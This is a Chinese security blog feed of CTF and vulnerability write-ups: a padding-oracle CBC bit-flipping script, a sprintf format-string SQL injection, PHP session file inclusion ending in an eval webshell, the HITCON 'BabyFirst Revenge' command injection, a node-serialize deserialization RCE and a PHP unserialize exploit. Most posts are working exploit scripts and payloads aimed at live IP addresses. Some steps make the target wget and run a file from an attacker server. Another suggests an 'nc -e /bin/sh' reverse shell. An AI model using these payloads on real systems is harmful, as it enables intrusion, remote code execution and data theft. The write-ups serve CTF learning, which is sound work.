1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import requestsimport base64url='http://111.231.111.54/login.php'N=16def inject_token(token): header=&#123;"Cookie":"PHPSESSID="+phpsession+";token="+token&#125; result=requests.post(url,headers=header) return resultdef xor(a, b): return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])def pad(string,N): l=len(string) if l!=N: return string+chr(N-l)*(N-l)def padding_oracle(N): get="" for i in xrange(1,N+1): for j in xrange(0,256): padding=xor(get,chr(i)*(i-1)) c=chr(0)*(16-i)+chr(j)+padding result=inject_token(base64.b64encode(c)) if "Error!" not in result.content: get=chr(j^i)+get break return getdef login(url): payload = &#123; "username":"admin", "password":"admin" &#125; coo1 = &#123; "PHPSESSID":"j297k7o6d8stcbvi2c23naj5j6" &#125; r = requests.post(url,cookies=coo1,data=payload,allow_redirects=False) token = r.headers['Set-Cookie'].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64') session = "j297k7o6d8stcbvi2c23naj5j6" return session, tokenwhile 1: phpsession,token = login(url) middle1=padding_oracle(N) print middle1 print "\n" if(len(middle1)+1==16): for i in xrange(0,256): middle=chr(i)+middle1 print "token:"+token print "middle:"+middle plaintext=xor(middle,token); print "plaintext:"+plaintext des=pad('admin',N) tmp="" print des.encode("base64") for i in xrange(16): tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i])) print tmp.encode('base64') result=inject_token(base64.b64encode(tmp)) # print result.content if "Login Form" not in result.content and "Error" not in result.content: print result.content print "success" exit() 得到:12token HGV8cWwzDgk2CBooPRYtXA==PHPSESSID j297k7o6d8stcbvi2c23naj5j6 成功进入后台。 格式化串sql注入这里放上admin.php的源码：12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);session_start();include('config.php');if(!$_SESSION['isadmin'])&#123; die('You are not admin');&#125;if(isset($_GET['id']))&#123; $id = mysql_real_escape_string($_GET['id']); if(isset($_GET['title']))&#123; $title = mysql_real_escape_string($_GET['title']); $title = sprintf("AND title='%s'", $title); &#125;else&#123; $title = ''; &#125; $sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id); $result = mysql_query($sql,$con); $row = mysql_fetch_array($result); if(isset($row['title'])&amp;&amp;isset($row['content']))&#123; echo "&lt;h1&gt;".$row['title']."&lt;/h1&gt;&lt;br&gt;".$row['content']; die(); &#125;else&#123; die("This article does not exist."); &#125;&#125;?&gt; 在看到sprintf后，可以很直接的联系到前阵子爆出的关于wordpress的格式化字符串SQL注入漏洞。传送门：从WordPress SQLi谈PHP格式化字符串问题（2017.11.01更新） 基于泄露出的源码，添加一些变量打印语句，本地测试代码：12345678910111213141516171819202122&lt;?php$con = mysql_connect("localhost", "root", "root");if(isset($_GET['id']))&#123; print_r("GET[id] =&gt; ".$_GET['id']."&lt;/br&gt;"); $id = mysql_real_escape_string($_GET['id'],$con); print_r("\$id =&gt; ".$id."&lt;/br&gt;"); if(isset($_GET['title']))&#123; print_r("GET[title] =&gt; ".$_GET['title']."&lt;/br&gt;"); $title = mysql_real_escape_string($_GET['title']); print_r("escape string tile: \$title =&gt; ".$title."&lt;/br&gt;"); $title = sprintf("AND title='%s'", $title); print_r("After first sprintf : \$title =&gt; ".$title."&lt;/br&gt;"); &#125;else&#123; $title = ''; &#125; $sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id); print_r("sql =&gt; ".$sql);&#125;?&gt; payload:1http://127.0.0.1:2500/index.php?id=1&amp;title=flag%1$&apos;%20 or 1=1%23 观察传入的title参数。 title传入的值为flag%1$&#39; or 1=1#，经过mysql_real_escape_string，会使得单引号&#39;前加上斜杠，也就是图片中的第四行：1escape string tile: $title =&gt; flag%1$\&apos; or 1=1# 接下来执行一次sprintf(&quot;AND title=&#39;%s&#39;&quot;, $title);，也就是将前面得到的title值title值为：1After first sprintf : $title =&gt; AND title=&apos;flag%1$\&apos; or 1=1#&apos; 接下来，又一次执行了sprintf：1sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; AND title=&apos;flag%1$\&apos; or 1=1#&apos;&quot;, $id); 由于PHP的sprintf中，%1$\这样的语法，百分号%后面的数表示使用第几个参数，$后面的表示类型，常见的类型比如s表示字符串等等。比如%1$s，表示使用第一个参数，类型为字符串（%s） 12345678910111213141516171819&lt;?php// 注format中，为防止 $ 被转义，在前面加了转义符。对于sprintf来说，即 %1$s$format1 = "hello,%1\$s one&lt;br/&gt;";$format2 = "hello,%2\$s two&lt;br/&gt;";$format3 = "hello,%1\$\' three&lt;br/&gt;";$format4 = "hello,%\$\' four&lt;br/&gt;";print_r("format string 1 : ".$format1);print_r("Result: ".sprintf($format1,"chybeta-1","chybeta-2"));print_r("format string 2 : ".$format2);print_r("Result: ".sprintf($format2,"chybeta-1","chybeta-2"));print_r("format string 3 : ".$format3);print_r(sprintf($format3,"chybeta-1","chybeta-2"));print_r("format string 4 : ".$format4);print_r(sprintf($format4,"chybeta-1","chybeta-2"));?&gt; 前两个示例是演示选择参数的用法。第三个和前两个比较，变成类型%\，会直接跳过不处理，并直接输出。第四个和第三个对比，少了参数选择，这会导致报错，无法正常打印。 回到前面的sprintf1sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; AND title=&apos;flag%1$\&apos; or 1=1#&apos;&quot;, $id); 通过百分号后的1，选择了一个参数（即id）不会爆错。利用类型%\，使得跳过。而原本在\后面的单引号，由于前面斜杠被当作了sprintf的类型，得以成功逃逸。 剩下的工作就是盲注了，比如：1http://111.231.111.54/admin.php?id=1&amp;title=flag%1$&apos;%20 or (SELECT%09GROUP_CONCAT(f14g)%09FROM%09web1.key) &lt; 255 # 脚本写得太丑，基于以前的写的框架修改的，这里就不贴啦。 最后注出来的表结构如下：123数据库：web1 表名:key 字段名:f14g flag:1LCTF&#123;N0!U_hacked_My_b1og&#125; 回到PHP的sprintf中，sprintf能吃掉\呢？在源码中，采用了case进行分类处理，而对于未知情况，则采取break。明显%\是未知情况，因此成功绕过。 小结 源码泄露 CBC翻转字节攻击 格式化串sql注入]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BEECMS v4.0_R_20160525 文件上传漏洞分析]]></title>
      <url>%2F2017%2F11%2F14%2FBEECMS-v4-0-R-20160525-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[其实这个洞早就出来了。只不过几天前看到cnvd上有人提交了。漏洞利用过程挺好玩的，分析一波。 漏洞复现：cmspoc:1python cmspoc.py -u http://vuln.com/index.php -t beecms -s v40_fileupload_gethshell.py 漏洞分析变量覆盖进后台后台任意文件上传]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一道CTF题：PHP文件包含]]></title>
      <url>%2F2017%2F11%2F09%2F%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2F</url>
      <content type="text"><![CDATA[今天在群里看到了几道题，这是其中之一。PHP文件包含 Session Task1http://54.222.188.152:22589/ Solutionphp伪协议读取源码点击login，发现链接变为：12http://54.222.188.152:22589/index.php?action=login.php 推测文件包含。 login.php访问：12http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-encode/resource=login.php 得到login.php源码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php require_once('config.php'); session_start(); if($_SESSION['username']) &#123; header('Location: index.php'); exit; &#125; if($_POST['username'] &amp;&amp; $_POST['password']) &#123; $username = $_POST['username']; $password = md5($_POST['password']); $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname); if ($mysqli-&gt;connect_errno) &#123; die("could not connect to the database:\n" . $mysqli-&gt;connect_error); &#125; $sql = "select password from user where username=?"; $stmt = $mysqli-&gt;prepare($sql); $stmt-&gt;bind_param("s", $username); $stmt-&gt;bind_result($res_password); $stmt-&gt;execute(); $stmt-&gt;fetch(); if ($res_password == $password) &#123; $_SESSION['username'] = base64_encode($username); header("location:index.php"); &#125; else &#123; die("Invalid user name or password"); &#125; $stmt-&gt;close(); $mysqli-&gt;close(); &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt; &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container" style="margin-top:100px"&gt; &lt;form action="login.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt; &lt;h3&gt;Login&lt;/h3&gt; &lt;label&gt;Username:&lt;/label&gt; &lt;input type="text" name="username" style="height:30px"class="span3"/&gt; &lt;label&gt;Password:&lt;/label&gt; &lt;input type="password" name="password" style="height:30px" class="span3"&gt; &lt;button type="submit" class="btn btn-primary"&gt;LOGIN&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; register.php访问：12http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-encode/resource=register.php register.php:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpif ($_POST['username'] &amp;&amp; $_POST['password']) &#123; require_once('config.php'); $username = $_POST['username']; $password = md5($_POST['password']); $mysqli = @new mysqli($dbhost, $dbuser, $dbpass, $dbname); if ($mysqli-&gt;connect_errno) &#123; die("could not connect to the database:\n" . $mysqli-&gt;connect_error); &#125; $mysqli-&gt;set_charset("utf8"); $sql = "select * from user where username=?"; $stmt = $mysqli-&gt;prepare($sql); $stmt-&gt;bind_param("s", $username); $stmt-&gt;bind_result($res_id, $res_username, $res_password); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows(); if($count) &#123; die('User name Already Exists'); &#125; else &#123; $sql = "insert into user(username, password) values(?,?)"; $stmt = $mysqli-&gt;prepare($sql); $stmt-&gt;bind_param("ss", $username, $password); $stmt-&gt;execute(); echo 'Register OK!&lt;a href="index.php"&gt;Please Login&lt;/a&gt;'; &#125; $stmt-&gt;close(); $mysqli-&gt;close();&#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link href="static/bootstrap.min.css" rel="stylesheet"&gt; &lt;script src="static/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="static/bootstrap.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container" style="margin-top:100px"&gt; &lt;form action="register.php" method="post" class="well" style="width:220px;margin:0px auto;"&gt; &lt;h3&gt;Register&lt;/h3&gt; &lt;label&gt;Username:&lt;/label&gt; &lt;input type="text" name="username" style="height:30px"class="span3"/&gt; &lt;label&gt;Password:&lt;/label&gt; &lt;input type="password" name="password" style="height:30px" class="span3"&gt; &lt;button type="submit" class="btn btn-primary"&gt;REGISTER&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; config.php访问：12http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-encode/resource=config.php config.php:123456&lt;?php$dbhost = &apos;localhost&apos;;$dbuser = &apos;web&apos;;$dbpass = &apos;webpass123&apos;;$dbname = &apos;web&apos;; ?&gt; index.phpindex.php源码：12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);session_start();if (isset($_GET['action'])) &#123; include $_GET['action']; exit();&#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;link href="css/bootstrap.css" rel="stylesheet" media="screen"&gt; &lt;link href="css/main.css" rel="stylesheet" media="screen"&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="container"&gt; &lt;div class="form-signin"&gt; &lt;?php if (isset($_SESSION['username'])) &#123; ?&gt; &lt;?php echo "&lt;div class=\"alert alert-success\"&gt;You have been &lt;strong&gt;successfully logged in&lt;/strong&gt;.&lt;/div&gt;&lt;a href=\"index.php?action=logout.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Logout&lt;/a&gt;";&#125;else&#123; ?&gt; &lt;?php echo "&lt;div class=\"alert alert-warning\"&gt;Please Login.&lt;/div&gt;&lt;a href=\"index.php?action=login.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Login&lt;/a&gt;&lt;a href=\"index.php?action=register.php\" class=\"btn btn-default btn-lg btn-block\"&gt;Register&lt;/a&gt;"; &#125; ?&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;?&gt; 代码审计SQL注入？往往注册与登陆操作中会有与数据库交互的地方，这也是sql注入的常见引发点。 看一下register.php，这里仅截取部分代码：123456789# register.php$mysqli-&gt;set_charset("utf8");$sql = "select * from user where username=?";$stmt = $mysqli-&gt;prepare($sql);$stmt-&gt;bind_param("s", $username);$stmt-&gt;bind_result($res_id, $res_username, $res_password);$stmt-&gt;execute();$stmt-&gt;store_result(); 再看一下login.php：12345678# login.php$sql = "select password from user where username=?";$stmt = $mysqli-&gt;prepare($sql);$stmt-&gt;bind_param("s", $username);$stmt-&gt;bind_result($res_password);$stmt-&gt;execute();$stmt-&gt;fetch(); 这里都使用了PHP的PDO处理，因此这里存在sql注入的可能性很小。 Session接着再看看，有哪些参数是可控的。 在login.php中：12345678910111213141516# 第3行session_start();if($_SESSION['username']) &#123; header('Location: index.php'); exit;&#125;# 第8行if($_POST['username'] &amp;&amp; $_POST['password']) &#123; $username = $_POST['username'];# 第20行 $stmt-&gt;bind_result($res_password);# 第24行 if ($res_password == $password) &#123; $_SESSION['username'] = base64_encode($username); header("location:index.php"); 这里使用了session来保存用户会话，php手册中是这样描述的： PHP 会将会话中的数据设置到 $_SESSION 变量中。 当 PHP 停止的时候，它会自动读取 $_SESSION 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。 对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。 考虑到变量$username是我们可控的，并且被设置到了$_SESSION中，因此我们输入的数据未经过滤的就被写入到了对应的sessioin文件中。结合前面的php文件包含，可以推测这里可以包含session文件。关于session包含的相关知识，可以见这篇文章chybeta:PHP文件包含 要包含session文件，需要知道文件的路径。先注册一个用户，比如chybeta。等登陆成功后。记录下cookie中的PHPSESSID的值，这里为udu8pr09fjvabtoip8icgurt85 访问：1http://54.222.188.152:22589/index.php?action=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85 这个/var/lib/php5/的session文件路径是测试出来的，常见的也就如chybeta:PHP文件包含中所述的几种。 base64_encode能包含，并且控制session文件，但要写入可用的payload，还需要绕过：1$_SESSION[&apos;username&apos;] = base64_encode($username); 如前面所示，输入的用户名会被base64加密。如果直接用php伪协议来解密整个session文件，由于序列化的前缀，势必导致乱码。 考虑一下base64的编码过程。比如编码abc。1234567未编码: abc转成ascii码： 97 98 99转成对应二进制（三组，每组8位）： 01100001 01100010 01100011重分组（四组，每组6位）： 011000 010110 001001 100011每组高位补零，变为每组8位：00011000 00010110 00001001 00100011每组对应转为十进制： 24 22 9 35查表得： Y W J j 考虑一下session的前缀：username|s:12:&quot;，中间的数字12表示后面base64串的长度。当base64串的长度小于100时，前缀的长度固定为15个字符，当base64串的长度大于100小于1000时，前缀的长度固定为16个字符。 由于16个字符，恰好满足一下条件：116个字符 =&gt; 16 * 6 = 96 位 =&gt; 96 mod 8 = 0 也就是说，当对session文件进行base64解密时，前16个字符固然被解密为乱码，但不会再影响从第17个字符后的部分也就是base64加密后的username。 Get Flag注册一个账号，比如：1chybetachybetachybetachybetachybetachybetachybetachybetachybeta&lt;?php eval($_GET[&apos;atebyhc&apos;]) ?&gt; 其base64加密后的长度为128，大于100。 123http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=phpinfo(); 成功getshell。 访问：1http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system(&apos;ls /&apos;); 访问:1http://54.222.188.152:22589/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;atebyhc=system(&apos;cat /fffflllllaaaagggg.txt&apos;); 小结考了几个知识点： php文件包含：伪协议利用 php文件包含：包含session文件 php-session知识及序列化格式 base64的基本原理]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HITCON CTF 2017-BabyFirst Revenge-writeup]]></title>
      <url>%2F2017%2F11%2F04%2FHITCON-CTF-2017-BabyFirst-Revenge-writeup%2F</url>
      <content type="text"><![CDATA[HITCON CTF 2017-BabyFirst Revenge-writeup BabyFirst Revenge123Do you remember BabyFirst from HITCON CTF 2015?This is the harder version!http://52.199.204.34/ Solution点开后，发现给了源码：12345678910&lt;?php $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 简要的分析一下： 对每个REMOTE_ADDR有对应的sandbox 能执行长度&lt;=5的命令 提供了reset功能。 之前在总结时，有遇到过，见chybeta:wafbypass，github地址为：https://github.com/CHYbeta/WAF-Bypass 原本的长度为8，而这里为5，条件苛刻了许多。在原本的场景中，我们可以通过构造文件名，之后利用ls命令及其参数将所需的shell命令写入到一个新文件中，并sh执行该新文件从而达到任意命令执行。这里同样可以借鉴其思路。关键点有两个： 长度限制 写入的顺序 这里先补充一些基本的知识。在linux中，倘若命令过长，可以用续行符（\）来将一行命令变为多行来写。具体例子如下：123456ubuntu@VM-207-93-ubuntu:~$ cat chybetaecho\ "chy\beta"ubuntu@VM-207-93-ubuntu:~$ sh chybetachybeta 在文件chybeta中，通过\将命令echo &quot;chybeta&quot;分成了三个部分。 倘若有一行出错呢？见下：12345678ubuntu@VM-207-93-ubuntu:~$ cat chybetaatebyhcecho\ "chy\beta"ubuntu@VM-207-93-ubuntu:~$ sh chybetachybeta: 1: chybeta: atebyhc: not foundchybeta 在最前我加了一句atebyhc，显然这不是命令，但这并不妨碍之后语句的执行，仍然能在\的作用下打印出chybeta。 接下来考虑如何构造文件。由于长度的限制，我们不能通过直接的ls -t来通过时间来进行文件名排序并构造。但我们可以曲线救国，先想办法把ls -t&gt;q写入到某个文件中，假设为文件a，然后sh执行文件a，这样命令ls -t的结果就能输出到文件q中。 我最后形成的payload1如下：123456&gt;-t\&gt;\&gt;q&gt;l\&gt;s\ \ls&gt;als&gt;&gt;a 这里详细解释。在默认情况下，命令ls，根据名称排序，空格等最前，数字其次，字母最后。当我们执行了前四条语句后，这时文件夹中情况如下(这是我本地环境)： 接着执行ls&gt;a后，a中文件内容： 紧接着执行ls&gt;&gt;a，这个命令会将ls的结果追加到文件a中： 其文本内容为：12345678910-t\&gt;qal\s \-t\&gt;qal\s \ 由前面所述，错误的命令不会影响后面正确语句的正确执行，所以第一行到第三行是错误的命令可忽略，并且第三行a后没有续行符，这不会影响到下一行。从第四行到第七行，由于续行符（\），可以构成如下的命令：1234l\s \-t\&gt;q 也即ls -t&gt;q，能够根据文件的时间来进行排序并将结果写入到文件q中。剩余几行，对结果无影响可忽略。 接下来延续以前的套路，想办法wget远程的某个文件，这样文件中能藏有足够长的payload。为方便起见-，可以将远程服务器的ip转换为十进制，这样不用考虑小数点带来的影响。假设我们的ip转换成十进制后为：2077173*48（hh这里我隐去一位数字）。则命令wget 2077173*48，会从2077173*48处下载并默认保存为index.html。考虑到长度的限制，我们需要将上述命令分段成长度小于等于5，并用续行符\隔开。考虑到，前面是使用ls -t&gt;q，而参数-t，会让新生成的文件排在前面，越早生成的文件排在后面。所以构造这一部分的payload如下:123456&gt;*48&gt;173\&gt;077\&gt;\ 2\&gt;et\&gt;wg\ 此时文件目录为： 接着执行命令sh a，注意文件a是我们第一阶段时生成的，其中包含命令ls -t&gt;q。运行完后查看新生成的文件q： 如前所述，这里构成了一个新的命令wget 2077173*48。注意在*48的下一行是文件a的名字，由于它后面没有\，并且字母顺序在s\之前，刚好起了一个分割的作用。 接下来执行命令sh q，这里为演示方便在本地shell中操作，这跟访问?cmd=sh%20a的效果是一样的: 可以发现成功的下载了远程的文件并保存到index.html中，而index.html是存放在我们自己的服务器上的，只要执行sh%20i*，注意这里用来通配符*，就能够执行sh index.html，从而执行其中的命令。 接下来，需要不断的进行探索flag的所在地。可以按照下述命令来实现命令的执行：123?cmd=rm%20i* // 删除index.html?cmd=sh%20a // 执行文件q，即wget新的index.html?cmd=sh%20i* // 执行index.html中的shell命令 在经过一番摸索后，发现在home目录的某个用户的主目录下有README.txt，其内容为：12Flag is in the MySQL databasefl4444g / SugZXUtgeJ52_Bvr 接下去通过替换index.html的内容。 index.html1mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;show databases;&quot; &gt; kk5 访问：http://52.199.204.34/sandbox/对应md5/kk5， 得到：123Databaseinformation_schemafl4gdb index.html:1mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x666c34676462&quot; &gt; kk7 访问：http://52.199.204.34/sandbox/对应md5/kk7， 得到：12GROUP_CONCAT(table_name)this_is_the_fl4g index.html1mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;(SELECT * FROM fl4gdb.this_is_the_fl4g&quot; &gt; kk9 访问：http://52.199.204.34/sandbox/对应md5/kk9， 得到：12secrethitcon&#123;idea_from_phith0n,thank_you:)&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Node.js中的反序列化漏洞：CVE-2017-5941]]></title>
      <url>%2F2017%2F11%2F01%2FNode-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941%2F</url>
      <content type="text"><![CDATA[合上吧，水文一篇。Node.js中的反序列化漏洞？（Node.js：这锅我不背） 漏洞复现安装好node和npm后，安装一下主角node-serialize1npm install node-serialize@0.0.4 --save 测试代码：123456789101112131415161718192021var serialize = require('node-serialize');var chybeta = &#123; vuln : function()&#123;require('child_process').exec('whoami', function(error, stdout, stderr) &#123;console.log(stdout);&#125;);&#125;,&#125;serResult = serialize.serialize(chybeta);console.log("serialize result:");console.log(serResult+'\n');console.log("Direct unserialize:")serialize.unserialize(serResult);console.log("\n");console.log("Use IIFE to PWN it:")exp = serResult.substr(0,serResult.length-2) + "()" + serResult.substr(-2);console.log(exp);console.log("Exec whoami:")serialize.unserialize(exp); 运行：1node index.js 可以看到执行了命令whoami 漏洞分析关于IIFE从运行截图来看，直接对序列化串进行反序列化，并不能导致远程命令执行，而是需要对序列化串进行修改。这里需要用到JS的IIFE(Immediately-Invoked Function Expression)，也即立即执行函数。这里简单的进行介绍。 前两种写法都是很正常的函数调用。 而第三种function(){console.log(&quot;Hello,chybeta three!&quot;)}();，由于它直接以function()开头，js解释器默认情况下碰到function关键字时将其当作函数声明，而第三种写法缺少函数声明所必需的函数名。若要执行该函数，则必须显式地指定其为函数表达式。 第四种写法(function(){console.log(&quot;Hello,chybeta four!&quot;)}());，则是常见的IIFE写法，js解释器在遇到()时，将其中的内容解释为函数表达式，而不是函数声明，因此得以执行。注意在Hello,chybeta four!&quot;)}的后面还有一对括号() node-serialize在node-serialize的源码中，即node-serialize/lib/serialize.js，第59行开始，是对反序列(unserialize)的处理：1234567891011121314151617181920212223242526exports.unserialize = function(obj, originObj) &#123; var isIndex; if (typeof obj === 'string') &#123; obj = JSON.parse(obj); isIndex = true; &#125; originObj = originObj || obj; var circularTasks = []; var key; for(key in obj) &#123; if(obj.hasOwnProperty(key)) &#123; if(typeof obj[key] === 'object') &#123; obj[key] = exports.unserialize(obj[key], originObj); &#125; else if(typeof obj[key] === 'string') &#123; if(obj[key].indexOf(FUNCFLAG) === 0) &#123; obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')'); &#125; else if(obj[key].indexOf(CIRCULARFLAG) === 0) &#123; obj[key] = obj[key].substring(CIRCULARFLAG.length); circularTasks.push(&#123;obj: obj, key: key&#125;); &#125; &#125; &#125; &#125; .....&#125; 其中有一句：1eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;); 不妨在该句之前加上console.log：1console.log(obj[key].substring(FUNCFLAG.length)); 执行node index.js， 所以在进行eval时，实际进行的语句为：1eval((function ()&#123;require(&apos;child_process&apos;).exec(&apos;whoami&apos;, function(error, stdout, stderr) &#123;console.log(stdout);&#125;);&#125;())); 后面的这对括号()，正是我们在修改原反序列化串时加上的：1exp = serResult.substr(0,serResult.length-2) + &quot;()&quot; + serResult.substr(-2); eval执行了该语句，从而造成了命令执行。 利用将exec里的替换成反弹shell，比如：1nc -e /bin/sh xxx xxx Refference 利用 Node.js 反序列化漏洞远程执行代码 NodeJS反序列化RCE漏洞的完美利用 其他无聊玩一玩。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2017年百越杯AWD-web-writeup]]></title>
      <url>%2F2017%2F10%2F28%2F2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup%2F</url>
      <content type="text"><![CDATA[再不更新博客就长草啦。PHP反序列化漏洞。 前言上周五参加福建省百越杯比赛，第二名。这篇小记一下线下赛的web题目，就当时找的漏洞做个简要的说明。由于一些配置不太清楚，所以现在复现起来可能不太准确，望见谅。原环境是linux下的，这里暂时win复现。 反序列化漏洞先看一下web源码的目录大概如下 在common文件下，有一个home.php，其源码如下：1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass home&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __destruct()&#123; if (in_array($this-&gt;method, array("ping"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; function ping($host)&#123; system("ping -c 2 $host"); &#125; function waf($str)&#123; $str=str_replace(' ','',$str); return $str; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim(mysql_escape_string($v))); &#125; &#125; &#125;$a=@$_POST['a'];@unserialize($a);?&gt; 首先有一个home类，然后通过post接受参数a，并对其进行反序列化。仔细观察home类，里面有几个方法。 __construct析构方法进行初始化操作，指定$method和$args。 __destruct析构方法在对象销毁时调用，其中使用了call_user_func_array()，如果method中有ping，则会调用ping方法，其参数即为$args。 ping方法执行sysyem命令：system(&quot;ping -c 2 $host&quot;);，注意到$host参数，由前即home类实例的$args。 waf方法，将传入的字符串中的空格去掉。 __wakeup方法，在反序列化时会自动调用，其中实现的功能是将参数$args先经过mysql_escape_string()，然后去除两边空格（trim），调用waf方法去掉字符串中的空格。 看到这里，思路就很明确啦。构造反序列化字符串，先经过__wakeup的过滤，在执行结束后利用__destruct调用ping方法，利用其中的system执行任意命令。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass home&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __destruct()&#123; if (in_array($this-&gt;method, array("ping"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; function ping($host)&#123; system("ping -c 2 $host"); &#125; function waf($str)&#123; $str=str_replace(' ','',$str); return $str; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; &#125;print_r("New a chybeta :)&lt;/br&gt;");$chybeta = new home("ping",array("1|whoami"));print_r("&lt;/br&gt;Get the serialize result:&lt;/br&gt;");$exp = serialize($chybeta);print_r($exp);print_r("&lt;/br&gt;&lt;/br&gt;unserialize and pwn it&lt;/br&gt;");print_r("exec: system(\"whoami\")&lt;/br&gt;The result: ");serialize($exp); 直接复制打印出来的反序列化串去post参数给home.php，并不成功。原因是有一些不可见字符。对以上的exp进行小改动，将反序列话结果输出到文件中，再用十六进制编辑器打开。1file_put_contents("temp", $exp); 可以上发现有一些零字节需要补上，最后payload如下：1234访问 common/home.phpPOST:a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125; 接下来进一步利用，在比赛时，我们需要读取到放在根目录下的flag（/flag）。而waf方法过滤了空格，这额可以用linux下的特殊变量\$\{IFS\}来代替。所以如果要读取flag，修改exp.php，注意需要转义$：1$chybeta = new home(&quot;ping&quot;,array(&quot;1|cat\$&#123;IFS&#125;/flag&quot;)); 关于linux环境下的命令执行绕过waf的方法，不妨看看这个: WAF-Bypass:命令注入 最后的payload即为：1234访问 common/home.phpPOST:a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:16:&quot;1|cat$&#123;IFS&#125;/flag 防御方法，直接将@unserialize($a);注释掉就行啦。 关于PHP反序列化漏洞，可以看看另一篇文章：chybeta: 浅谈php反序列化漏洞 